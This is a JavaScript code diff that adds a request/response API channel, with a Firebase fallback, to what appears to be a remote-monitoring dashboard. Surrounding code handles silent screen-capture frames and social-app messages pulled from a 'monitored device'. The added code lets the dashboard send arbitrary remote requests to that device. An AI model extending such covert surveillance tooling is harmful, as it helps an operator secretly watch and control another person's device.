@@ -104,7 +104,14 @@ function setupDataChannelEvents(channel) {
     channel.onmessage = (event) => {
         try {
             const data = JSON.parse(event.data);
-            if (data.type === "SCREEN_FRAME" && data.payload && data.payload.frame) {
+            if (data.type === "API_RESPONSE" && data.payload && data.payload.requestId) {
+                const reqId = data.payload.requestId;
+                if (apiPendingCallbacks.has(reqId)) {
+                    const { resolve } = apiPendingCallbacks.get(reqId);
+                    apiPendingCallbacks.delete(reqId);
+                    resolve(data.payload.data);
+                }
+            } else if (data.type === "SCREEN_FRAME" && data.payload && data.payload.frame) {
                 renderSilentScreencapFrame(data.payload.frame);
             } else if (data.type === "DB_RESPONSE_SOCIAL" && data.payload && data.payload.messages) {
                 handleP2pSocialDatabaseResponse(data.payload.appKey, data.payload.messages);
@@ -115,6 +122,59 @@ function setupDataChannelEvents(channel) {
             console.log("[WebRTC Manager] P2P Message Received:", event.data);
         }
     };
+}
+
+const apiPendingCallbacks = new Map();
+
+function sendWebDashboardApiRequest(path, method = "GET", body = null) {
+    return new Promise((resolve, reject) => {
+        const requestId = "req_" + Date.now() + "_" + Math.floor(Math.random() * 10000);
+        apiPendingCallbacks.set(requestId, { resolve, reject });
+
+        const reqPayload = {
+            type: "API_REQUEST",
+            requestId: requestId,
+            path: path,
+            method: method,
+            body: typeof body === "object" && body !== null ? JSON.stringify(body) : (body || "")
+        };
+
+        if (dc && dc.readyState === "open") {
+            dc.send(JSON.stringify(reqPayload));
+            console.log(`[WebRTC P2P API] Sent: ${method} ${path} (${requestId})`);
+        } else {
+            console.log(`[Firebase Action API] Fallback Sent: ${method} ${path} (${requestId})`);
+            const uid = currentUser ? currentUser.uid : "default_user";
+            const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
+
+            const actionRef = firebase.database().ref(`users/${uid}/devices/${devId}/actions/${requestId}`);
+            actionRef.set({
+                status: "pending",
+                path: path,
+                method: method,
+                body: reqPayload.body,
+                timestamp: Date.now()
+            });
+
+            actionRef.child("response").on("value", snapshot => {
+                const resVal = snapshot.val();
+                if (resVal) {
+                    actionRef.off();
+                    if (apiPendingCallbacks.has(requestId)) {
+                        apiPendingCallbacks.delete(requestId);
+                        resolve(resVal);
+                    }
+                }
+            });
+        }
+
+        setTimeout(() => {
+            if (apiPendingCallbacks.has(requestId)) {
+                apiPendingCallbacks.delete(requestId);
+                reject(new Error("API Request Timeout"));
+            }
+        }, 15000);
+    });
 }
 
 function queryP2pLocalDatabase(queryType, keyParam) {
